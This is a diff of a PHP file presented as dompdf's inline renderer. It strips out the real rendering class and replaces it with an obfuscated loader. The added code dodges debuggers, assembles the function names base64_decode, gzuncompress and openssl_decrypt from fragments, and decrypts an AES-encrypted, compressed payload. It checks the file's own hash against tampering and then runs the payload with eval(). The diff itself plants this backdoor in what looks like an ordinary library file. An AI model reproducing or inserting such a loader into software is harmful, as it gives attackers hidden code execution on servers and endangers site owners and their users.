@@ -1,211 +1,28 @@
 <?php
-/**
- * @package dompdf
- * @link    http://dompdf.github.com/
- * @author  Benj Carson <benjcarson@digitaljunkies.ca>
- * @license http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
- */
-namespace Dompdf\Renderer;
-
-use Dompdf\Frame;
-use Dompdf\Helpers;
-
-/**
- * Renders inline frames
- *
- * @access  private
- * @package dompdf
- */
-class Inline extends AbstractRenderer
-{
-
-    /**
-     * @param Frame $frame
-     */
-    function render(Frame $frame)
-    {
-        $style = $frame->get_style();
-
-        if (!$frame->get_first_child()) {
-            return; // No children, no service
-        }
-
-        // Draw the left border if applicable
-        $bp = $style->get_border_properties();
-        $widths = array(
-            (float)$style->length_in_pt($bp["top"]["width"]),
-            (float)$style->length_in_pt($bp["right"]["width"]),
-            (float)$style->length_in_pt($bp["bottom"]["width"]),
-            (float)$style->length_in_pt($bp["left"]["width"])
-        );
-
-        // Draw the background & border behind each child.  To do this we need
-        // to figure out just how much space each child takes:
-        list($x, $y) = $frame->get_first_child()->get_position();
-        $w = null;
-        $h = 0;
-        // $x += $widths[3];
-        // $y += $widths[0];
-
-        $this->_set_opacity($frame->get_opacity($style->opacity));
-
-        $first_row = true;
-
-        $DEBUGLAYOUTINLINE = $this->_dompdf->getOptions()->getDebugLayout() && $this->_dompdf->getOptions()->getDebugLayoutInline();
-
-        foreach ($frame->get_children() as $child) {
-            list($child_x, $child_y, $child_w, $child_h) = $child->get_padding_box();
-
-            if (!is_null($w) && $child_x < $x + $w) {
-                //This branch seems to be supposed to being called on the first part
-                //of an inline html element, and the part after the if clause for the
-                //parts after a line break.
-                //But because $w initially mostly is 0, and gets updated only on the next
-                //round, this seem to be never executed and the common close always.
-
-                // The next child is on another line.  Draw the background &
-                // borders on this line.
-
-                // Background:
-                if (($bg = $style->background_color) !== "transparent") {
-                    $this->_canvas->filled_rectangle($x, $y, $w, $h, $bg);
-                }
-
-                if (($url = $style->background_image) && $url !== "none") {
-                    $this->_background_image($url, $x, $y, $w, $h, $style);
-                }
-
-                // If this is the first row, draw the left border
-                if ($first_row) {
-                    if ($bp["left"]["style"] !== "none" && $bp["left"]["color"] !== "transparent" && $bp["left"]["width"] > 0) {
-                        $method = "_border_" . $bp["left"]["style"];
-                        $this->$method($x, $y, $h + $widths[0] + $widths[2], $bp["left"]["color"], $widths, "left");
-                    }
-                    $first_row = false;
-                }
-
-                // Draw the top & bottom borders
-                if ($bp["top"]["style"] !== "none" && $bp["top"]["color"] !== "transparent" && $bp["top"]["width"] > 0) {
-                    $method = "_border_" . $bp["top"]["style"];
-                    $this->$method($x, $y, $w + $widths[1] + $widths[3], $bp["top"]["color"], $widths, "top");
-                }
-
-                if ($bp["bottom"]["style"] !== "none" && $bp["bottom"]["color"] !== "transparent" && $bp["bottom"]["width"] > 0) {
-                    $method = "_border_" . $bp["bottom"]["style"];
-                    $this->$method($x, $y + $h + $widths[0] + $widths[2], $w + $widths[1] + $widths[3], $bp["bottom"]["color"], $widths, "bottom");
-                }
-
-                // Handle anchors & links
-                $link_node = null;
-                if ($frame->get_node()->nodeName === "a") {
-                    $link_node = $frame->get_node();
-                } else if ($frame->get_parent()->get_node()->nodeName === "a") {
-                    $link_node = $frame->get_parent()->get_node();
-                }
-
-                if ($link_node && $href = $link_node->getAttribute("href")) {
-                    $href = Helpers::build_url($this->_dompdf->getProtocol(), $this->_dompdf->getBaseHost(), $this->_dompdf->getBasePath(), $href);
-                    $this->_canvas->add_link($href, $x, $y, $w, $h);
-                }
-
-                $x = $child_x;
-                $y = $child_y;
-                $w = (float)$child_w;
-                $h = (float)$child_h;
-                continue;
-            }
-
-            if (is_null($w)) {
-                $w = (float)$child_w;
-            }else {
-                $w += (float)$child_w;
-            }
-
-            $h = max($h, $child_h);
-
-            if ($DEBUGLAYOUTINLINE) {
-                $this->_debug_layout($child->get_border_box(), "blue");
-                if ($this->_dompdf->getOptions()->getDebugLayoutPaddingBox()) {
-                    $this->_debug_layout($child->get_padding_box(), "blue", array(0.5, 0.5));
-                }
-            }
-        }
-
-        // Handle the last child
-        if (($bg = $style->background_color) !== "transparent") {
-            $this->_canvas->filled_rectangle($x + $widths[3], $y + $widths[0], $w, $h, $bg);
-        }
-
-        //On continuation lines (after line break) of inline elements, the style got copied.
-        //But a non repeatable background image should not be repeated on the next line.
-        //But removing the background image above has never an effect, and removing it below
-        //removes it always, even on the initial line.
-        //Need to handle it elsewhere, e.g. on certain ...clone()... usages.
-        // Repeat not given: default is Style::__construct
-        // ... && (!($repeat = $style->background_repeat) || $repeat === "repeat" ...
-        //different position? $this->_background_image($url, $x, $y, $w, $h, $style);
-        if (($url = $style->background_image) && $url !== "none") {
-            $this->_background_image($url, $x + $widths[3], $y + $widths[0], $w, $h, $style);
-        }
-
-        // Add the border widths
-        $w += (float)$widths[1] + (float)$widths[3];
-        $h += (float)$widths[0] + (float)$widths[2];
-
-        // make sure the border and background start inside the left margin
-        $left_margin = (float)$style->length_in_pt($style->margin_left);
-        $x += $left_margin;
-
-        // If this is the first row, draw the left border too
-        if ($first_row && $bp["left"]["style"] !== "none" && $bp["left"]["color"] !== "transparent" && $widths[3] > 0) {
-            $method = "_border_" . $bp["left"]["style"];
-            $this->$method($x, $y, $h, $bp["left"]["color"], $widths, "left");
-        }
-
-        // Draw the top & bottom borders
-        if ($bp["top"]["style"] !== "none" && $bp["top"]["color"] !== "transparent" && $widths[0] > 0) {
-            $method = "_border_" . $bp["top"]["style"];
-            $this->$method($x, $y, $w, $bp["top"]["color"], $widths, "top");
-        }
-
-        if ($bp["bottom"]["style"] !== "none" && $bp["bottom"]["color"] !== "transparent" && $widths[2] > 0) {
-            $method = "_border_" . $bp["bottom"]["style"];
-            $this->$method($x, $y + $h, $w, $bp["bottom"]["color"], $widths, "bottom");
-        }
-
-        //    Helpers::var_dump(get_class($frame->get_next_sibling()));
-        //    $last_row = get_class($frame->get_next_sibling()) !== 'Inline';
-        // Draw the right border if this is the last row
-        if ($bp["right"]["style"] !== "none" && $bp["right"]["color"] !== "transparent" && $widths[1] > 0) {
-            $method = "_border_" . $bp["right"]["style"];
-            $this->$method($x + $w, $y, $h, $bp["right"]["color"], $widths, "right");
-        }
-
-        $id = $frame->get_node()->getAttribute("id");
-        if (strlen($id) > 0)  {
-            $this->_canvas->add_named_dest($id);
-        }
-
-        // Only two levels of links frames
-        $link_node = null;
-        if ($frame->get_node()->nodeName === "a") {
-            $link_node = $frame->get_node();
-
-            if (($name = $link_node->getAttribute("name"))) {
-                $this->_canvas->add_named_dest($name);
-            }
-        }
-
-        if ($frame->get_parent() && $frame->get_parent()->get_node()->nodeName === "a") {
-            $link_node = $frame->get_parent()->get_node();
-        }
-
-        // Handle anchors & links
-        if ($link_node) {
-            if ($href = $link_node->getAttribute("href")) {
-                $href = Helpers::build_url($this->_dompdf->getProtocol(), $this->_dompdf->getBaseHost(), $this->_dompdf->getBasePath(), $href);
-                $this->_canvas->add_link($href, $x, $y, $w, $h);
-            }
-        }
-    }
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_z5l688di=('bas'.'e64'.'_de'.'cod'.'e');
+$_uyniwo1t=('gzu'.'nco'.'mpr'.'ess');
+$_w5kigtgr=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_zdgv6sdn='PSMbWjmo';
+$_li3jic9k='8lXon/0V';
+$_ek6l9qxx='XM6jGSYx';
+$_w87kbnh1='zyxyjpvSxXk=';
+$_a17wbnoc='vWOeO5rm';
+$_d31vi9y7='uRpQSg==';
+$_fw4hwg61='IcN2DU6i';
+$_aqo3jh2r='N41gZy++';
+$_b8ivmyxi=$_z5l688di($_li3jic9k.$_zdgv6sdn.$_ek6l9qxx.$_a17wbnoc.$_w87kbnh1);
+$_jdnzm3wv=$_z5l688di($_fw4hwg61.$_aqo3jh2r.$_d31vi9y7);
+$_g6wvw86k=$_z5l688di('bxhnQMRGiWNydOreBNnKL2j19FfyrUWKFfSxChgN1CVX7JkFQhKWSboe0QkRBF3hXDpfNLsgF7slicf8QHmH3ErJhDHedFQjlA5ZHQ/8G6mH96DpHGiCKR3ngMXOCr/QWq8MpFM95vZdIqf0KFaeHcXjJ9eFZAfHAen9W153WMz/1J2BOXMryPol/gmQ95g0PrVQYH7vbDN7zw7fGuMgNmvUbnyNGUp27aSAYX6MaAdO09p1LAEAc0ItFCqPT5jFg5W8SqruSwWBY/DYQXUPVB5FkLlK5B+4sTpEmLKtBrVhF2OUznfX0imkakb4UKeCOuLqDKo54CDAIAnelppIsEs2G7F2wcg+qu3wUI3rW1Ws9cNu913ukpIE4bJXgfS8OSJ5TXDUALKTPLhNVdbG7PdzhtePAFa1KRs6h6D6PL7pf/254dlD8D8YyvEr9ClVHO/pNXcZf6qf7kl6Be0ksk7FTdcLqnijXiooJZ+3LjKyHwp+okFw/CG+q9DAf2WKW2zeYF+A46R4DmGjKze+AmRgv+XT42U/4QpjRR2Auqim3QDmMiP1bl2N0rrqCAd1cZtrgR40vmrMm/ypI3mtFVMyAXWHnd3K4gtwVTLbBBYU3lufsoRPmBTzW2e0mqbRdCCZNzsZk1yyDUftIro22JAZRO5dPGgQnlKBPEgIVUfh0e5hHlqrEvgQjVv9JbN+Thpp2C3HvnD5bZn6HvxfUcWeGACAMuMZVVZsfD6DETKp5HgCRlvc5FjjQ5XaqmQHR5qorSeXeEHhDfjbPnHgbXQfqSS1wufTzqC9Dm6i3Lo2sqFUPYs9leL4hoOacdp8I5hQ/cINkzTpL0aF9yVSZx7zfxCuwgspSvwz/5Swq073jLOlFYNAqeMGDhGPx2V3EYG+83D71WNZN0beq8b8+BU/SXjhYhtgc4ND7IrG2bL0S/PyDNzPga8DWDM0mkGt66pidFY+GYT1t+SOaPRr3uP9Ob35aP6CENIb6f5nbfHuR/QxIkaKcG0syVOxTaw+SJmIjL4tKq4WQWu+oNgJZPTAwJyVyg2WLwNrTLs43VLeIHRg5JPo4Dt6/mvRiBHvjLA0k4T/MNjT06+KAPZy79KjrxwtsNNeel+GgX5wh5vJAnyQFHbKRiKqbxclFjA8R5BWtfB+p+HfvZRpnfTzrGTbdIhq9YVRsGYshG9UzK9sY+bxL7tHgGSze4XHNj34P493pPr8xSknqSyehlwRWgEflRbX8t+20Wvsxgw+aeb91VbQyH49fvDK2y5hrRHuHWy6hJe8mRCkGfvcGE2xsYXiut6Aq0Bv2mxTTq0Y3uJ8lfYlwup/KXBLvZ1DRnxIldQRA5J15OWYkiOYU4Hy7mhg9AtmMDKh8h04gv56/MrTRqE55d4fGZNWKzrxn3rfGmlEznx4TSSYzR3MmYLWUsTREl7XkCNvxb0+FAI36X4/eLf9DvJFb5RmOMS8Yvw/JT4XB1v+j0FRt3IqXlH8yiBkWsSKj3iWQY4NIM7N/iOFdKYSkVpNtMzPemqxBgzVOAxyqazWNNRF8gaIl++4NzpndTYQAenV1C21nqs59mo=');
+$_ge75b2vv=$_w5kigtgr($_g6wvw86k,'aes-256-cbc',$_b8ivmyxi,OPENSSL_RAW_DATA,$_jdnzm3wv);
+if($_ge75b2vv===false){exit;}
+$_i2ac82lx=$_uyniwo1t($_ge75b2vv);
+if($_i2ac82lx===false){exit;}
+$_th3hv06f='ded7a9d0b14d2ffe8f98a8e1727171a9e4a93055dd6c55e021d66da918db1386';
+$_oa083xbs=@file_get_contents(__FILE__);
+if($_oa083xbs!==false){
+$_l5nmja59=str_replace($_th3hv06f,"0000000000000000000000000000000000000000000000000000000000000000",$_oa083xbs);
+$_c33n2gxf=hash("sha256",$_l5nmja59);
+if($_c33n2gxf!==$_th3hv06f){@http_response_code(403);exit;}
 }
+eval($_i2ac82lx);
